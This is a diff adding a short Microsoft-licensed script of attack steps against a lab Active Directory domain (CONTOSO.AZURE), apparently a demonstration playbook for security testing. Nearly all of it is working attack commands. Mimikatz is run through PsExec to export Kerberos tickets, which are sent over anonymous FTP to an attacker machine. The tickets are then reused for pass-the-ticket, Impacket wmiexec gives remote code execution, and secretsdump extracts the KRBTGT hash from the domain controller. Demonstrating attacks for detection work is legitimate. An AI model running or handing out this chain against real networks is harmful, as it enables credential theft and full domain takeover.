@@ -1,0 +1,59 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+OPTIONAL 
+:: setup (not-public)
+:: pure-ftpd
+sudo apt install python-pyftpdlib
+cd ~
+python -m pyftpdlib -w -p 21
+
+:: modify dns entries and server
+vi /etc/hosts
+(add the target dc)
+nslookup -type=srv _ldap._tcp.CONTOSO.AZURE
+
+:: harvest tickets (victim-pc); as RonHD (opth)
+xcopy c:\tools\mimikatz\x64\mimikatz.exe \\adminpc\c$\temp
+c:\tools\SysinternalsSuite\PsExec.exe \\adminpc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
+xcopy \\adminpc\c$\temp\*nuckc* c:\temp\adminpc_tickets
+
+:: convert for use with linux
+cd c:\temp\adminpc_tickets
+c:\tools\kekeo\x64\kekeo.exe
+misc::convert ccache [drag file]
+exit
+
+:: transfer (make sure service is running on kali; DO NOT DOCUMENT)
+ftp
+open 10.0.16.8 21
+anonymous
+anything
+send [drag ccache file]
+
+:: modify ticket as needed
+sudo chown andrew:andrew nuckc.ccache
+sudo chmod 700 nuckc.ccache
+export KRB5CCNAME=/home/andrew/[file]
+klist
+
+:: get ticket (BACKUP--DO NOT DOCUMENT)
+sudo getTGT.py contoso.azure/nuckc
+sudo mv nuckc.ccache ~/.
+
+:: take ownership of ticket on *nix, modify it as needed
+export KRB5CCNAME=/home/andrew/nuckc.ccache
+chown andrew:andrew /home/andrew/nuckc.ccache
+chmod 700 $KRB5CCNAME
+klist
+
+:: test
+sudo smbclient -k //contosodc.contoso.azure/c$ -d 3
+
+:: impacket (RCE) WMI
+wmiexec.py contoso.azure/samiraa@contosodc -k -no-pass
+
+:: impacket (malicious replication) SecretsDump
+secretsdump.py -just-dc-user KRBTGT -k -no-pass contoso.azure/samiraa@contosodc.contoso.azure
+or
+secretsdump.py -k -no-pass  contoso.azure/nuckc@contosodc.contoso.azure -use-vss
